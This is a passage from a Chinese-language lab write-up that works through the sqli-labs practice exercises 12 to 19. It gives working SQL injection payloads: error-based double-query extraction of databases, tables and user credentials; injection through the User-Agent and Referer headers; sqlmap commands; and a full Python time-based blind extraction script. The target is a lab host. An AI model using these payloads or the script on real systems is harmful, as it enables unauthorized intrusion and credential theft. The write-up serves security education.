构造poc进行验证：

`uname=admin") and 1=1#`有回显

![image-20211207203703495](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020058134.png)

`uname=admin") and 1=2#`无回显，证明猜想正确。

![image-20211207203741861](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020058591.png)

之后的步骤同实验11，只要把`uname=admin'`换成`uname=admin”)`即可



## 实验十三	POST 单引号变形双注入

输入`admin`&`admin`无正确回显。

输入`admin'`有报错回显：`near 'admin') LIMIT 0,1' at line 1`，猜测后台语句：`SELECT username, password FROM 用户表 WHERE username=('input') and password=('input');`

![image-20211207204051533](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020058490.png)

构造poc：`admin ') or 1=1 #`，没有任何显示，说明猜想正确。

![image-20211207204315576](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020059975.png)

通过双注入的方法：

### 查询数据库

和实验五一样，通过修改`limit`的值查询不同的数据库：

```
uname=admin') and (select 1 from (select count(*),concat((SELECT schema_name FROM information_schema.schemata limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a) #
```

![image-20211207204509805](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020059336.png)

### 查询数据库中的表

```
uname=admin') and (select 1 from (select count(*),concat((SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA="security" limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a) #
```

![image-20211207204755629](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020059064.png)

### 查表中的字段

```
uname=admin') and (select 1 from (select count(*),concat((SELECT column_name FROM information_schema.columns where table_schema='security' and table_name='users' limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a) #
```

![image-20211207204950875](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020059986.png)

### 查数据

```
uname=admin') and (select 1 from (select count(*),concat((select concat_ws(id,username,password) from users limit 1,1),floor (rand(0)*2))x from information_schema.tables group by x)a) #
```

![image-20211207205129204](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020059613.png)



## 实验十四	POST双引号变形双注入

输入`uname=admin"`有报错回显，猜测后台语句：`SELECT username, password FROM 用户表 WHERE username=("input") and password=("input");`

![image-20211207205251958](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020059848.png)

构造poc：`admin" or 1=1 #`，没有任何显示，说明猜想正确。

接下来的步骤同实验十三，只需要把`admin')`改为`admin"`



## 实验十五	基于bool型/时间延迟单引号POST型盲注

把之前提到过的常见的payload都试了一遍发现都没有回显，猜测可能存在盲注，尝试

```
admin'and if(ascii(substr(database(),1,1))=114,1,sleep(5))#
```

存在明显延迟，说明存在时间盲注。

下面是时间盲注的脚本：

```python
import requests
from time import time

url = "http://10.12.202.251:22699/Less-15/"
char = "abcdefghijklmnopqrstuvwxyz_"
password = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-@!"


def database():
    for i in range(0, 10):
        database = ""
        for j in range(1, 20):
            for str in password:
                time1 = time()
                data = {
                    'uname': "admin' and If((mid((select schema_name from information_schema.schemata limit %d,1),%d,1))='%s',sleep(0.1),1)#" % (i, j, str), 'passwd': "1"}
                res = requests.post(url, data=data)

                time2 = time()

                if time2 - time1 > 0.1:
                    database += str
                    break
        print("the %d database: " % (i + 1))
        print(database)


def table():
    for i in range(0, 10):
        table = ""
        for j in range(1, 20):
            for str in char:
                time1 = time()
                data = {
                    'uname': "admin' and If((mid((select table_name from information_schema.tables where table_schema='security' limit %d,1),%d,1))='%s',sleep(0.1),1)#" % (i, j, str), 'passwd': "1"}
                res = requests.post(url, data=data)

                time2 = time()

                if time2 - time1 > 0.1:
                    table += str
                    break
        print("the %d table: " % (i + 1))
        print(table)


def column():
    for i in range(0, 10):
        column = ""
        for j in range(1, 20):
            for str in char:
                time1 = time()
                data = {
                    'uname': "admin' and If((mid((select concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' limit %d,1),%d,1))='%s',sleep(0.1),1)#" % (i, j, str), 'passwd': "1"}
                res = requests.post(url, data=data)

                time2 = time()

                if time2 - time1 > 0.1:
                    column += str
                    break
        print("the %d column: " % (i + 1))
        print(column)


def data_value():
    for i in range(0, 10):
        value = ""
        for j in range(1, 20):
            for str in char:
                time1 = time()
                data = {
                    'uname': "admin' and If((mid((select concat_ws(id,username,password) from users limit %d,1),%d,1))='%s',sleep(0.1),1)#" % (i, j, str), 'passwd': "1"}
                res = requests.post(url, data=data)

                time2 = time()

                if time2 - time1 > 0.1:
                    value += str
                    break
        print("the %d value: " % (i + 1))
        print(value)


if __name__ == "__main__":
    print("start!")
    data_value()
    print("end!")
```

运行结果：

![image-20211207212831283](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020059250.png)



## 实验十六	post方法双引号括号绕过时间盲注

尝试`admin' and if(ascii(substr(database(),1,1))=115,1,sleep(5))#`失败

尝试`admin" and if(ascii(substr(database(),1,1))=115,1,sleep(5))#`失败

尝试`admin") and if(ascii(substr(database(),1,1))=115,1,sleep(5))#`成功

其他步骤同实验15，只需要把脚本中的`admin'`改为`admin")`即可。



------

### 【一些原理】

- 用户输入的数据被sql解释器执行，通过猜测后台的sql语句，进行恶意的sql语句查询。
- mysql增删改语句:

1、增：

```
insert into users values('66','name','pass');
```

2、删：

```
delete from 表名;  
delete from 表名where id=1;  
删数据库：drop database 数据库名;  
删除表：drop table 表名;  
删除表中的列:alter table 表名drop column 列名;
```

3、改：

```
修改所有：updata 表名set 列名='新的值，非数字加单引号' ;  
带条件的修改：updata 表名set 列名='新的值，非数字加单引号' where id=6;
```



## 实验十七	基于错误的更新查询POST注入

这题传入账号和想要重置的密码，当输入合法时，提示密码修改成功。

这道题目严格检查了`uname`，但是没有严格检查`password`，说明注入点在`password`。

输入`passwd=admin'`，发现报错回显：`near 'admin'' at line 1`，说明是单引号闭合（字符型注入）。

![image-20211207215227592](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020059817.png)

利用**双注入**：

### 查询数据库

```
uname=admin&passwd=1' and (select 1 from (select count(*),concat((SELECT schema_name FROM information_schema.schemata limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a) #
```

![image-20211207215445857](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020059612.png)

### 查询数据库中的表

```
uname=admin&passwd=1' and (select 1 from (select count(*),concat((SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA="security" limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a) #
```

![image-20211207215555271](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020059773.png)

### 查表中的字段

```
uname=admin&passwd=1' and (select 1 from (select count(*),concat((SELECT column_name FROM information_schema.columns where table_schema='security' and table_name='users' limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a) #
```

![image-20211207215814025](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020059488.png)

### 查数据

```
uname=admin&passwd=1' and (select 1 from (select count(*),concat((select concat_ws(id,username,password) from users limit 1,1),floor (rand(0)*2))x from information_schema.tables group by x)a) #
```

![image-20211207215902379](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020100037.png)



## 实验十八	基于错误的用户代理，头部POST注入

首先输入`admin`&`admin`进行测试，发现回显user-agent：

![image-20211207220023295](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020100231.png)

猜测User-Agent是注入点，尝试控制：`User-Agent: 1`

![image-20211207220926754](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020100616.png)

输入：`User-Agent: 1'`，发现有报错回显，说明是用单引号闭合的。

![image-20211207221007900](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020100421.png)

之后的payload可以参考实验十七，只是要放在`User-Agent=1'`后面，并且这里最后不能用`#`注释掉之后的内容（会报错），改成`or '1'='1`

### 1、手工注入

payload：

#### 查询数据库

```
User-Agent: 1' and (select 1 from (select count(*),concat((SELECT schema_name FROM information_schema.schemata limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a) or '1'='1
```

![image-20211207221557666](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020100291.png)

#### 查询数据库中的表

```
User-Agent: 1' and (select 1 from (select count(*),concat((SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA="security" limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a) or '1'='1
```

![image-20211207221710474](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020100119.png)

#### 查表中的字段

```
User-Agent: 1' and (select 1 from (select count(*),concat((SELECT column_name FROM information_schema.columns where table_schema='security' and table_name='users' limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a) or '1'='1
```

![image-20211207221759095](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020100152.png)

#### 查数据

```
User-Agent: 1' and (select 1 from (select count(*),concat((select concat_ws(id,username,password) from users limit 1,1),floor (rand(0)*2))x from information_schema.tables group by x)a) or '1'='1
```

![image-20211207221922420](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020100789.png)



### 2、sqlmap

从BurpSuite中把请求信息复制到txt文件中，把`User-Agent`的值设为*。

<img src="https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020100813.png" alt="image-20211207223810966" style="zoom:80%;" />

```cmd
python sqlmap.py -r Less-18.txt
```

其中：`-r`：sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）

![image-20211207223856641](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020100463.png)

之后的步骤同之前的sqlmap。



## 实验十九	基于头部的RefererPOST报错注入

首先输入`admin`&`admin`进行测试，发现回显referer：

![image-20211207222020462](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020100786.png)

同样测试referer是否为注入点。输入`Referer: 1'`有报错回显，和实验十八一样都是用单引号闭合。

![image-20211207222118000](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020100896.png)

### 1、手工注入

所以构造的payload同实验十八，只需要把payload放在`Referer`中。

### 2、sqlmap

同理实验18，先把request保存下来，把`Rerferer`的值设为*。

<img src="https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020100466.png" alt="image-20211207224018128" style="zoom: 80%;" />

```cmd
python sqlmap.py -r Less-19.txt
```

![image-20211207224242335](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020100384.png)